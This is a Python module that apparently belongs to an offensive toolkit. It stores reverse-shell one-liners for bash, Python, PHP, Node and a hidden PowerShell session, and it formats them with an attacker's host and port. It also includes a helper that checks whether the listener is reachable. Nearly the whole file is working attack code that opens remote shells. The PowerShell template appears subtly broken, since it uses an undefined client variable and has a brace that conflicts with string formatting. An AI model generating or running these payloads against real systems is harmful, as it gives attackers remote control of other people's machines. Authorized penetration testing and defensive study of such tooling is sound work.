import asyncio
import socket
from typing import Dict, Any

SHELL_PAYLOADS = {
    'bash': "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    'python': ("python3 -c 'import socket,os,pty;s=socket.socket();"
               "s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"),
    'php': "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'node': ("require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1');"),
    'powershell': ("powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                   "New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
                   "$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;"
                   "while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);"
                   "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                   "$writer.Write($sendback2);$writer.Flush()}'")
}

async def generate_shell(lang: str, lhost: str, lport: int) -> str:
    lang = lang.lower()
    if lang not in SHELL_PAYLOADS:
        return f"[error] Unsupported shell language: {lang}"
    try:
        return SHELL_PAYLOADS[lang].format(lhost=lhost, lport=lport)
    except Exception as e:
        return f"[error] {e}"

async def check_listener(lhost: str, lport: int, timeout: float = 2.0) -> bool:
    try:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, _check_tcp, lhost, lport, timeout)
    except Exception:
        return False

def _check_tcp(lhost, lport, timeout):
    try:
        with socket.create_connection((lhost, lport), timeout=timeout):
            return True
    except Exception:
        return False 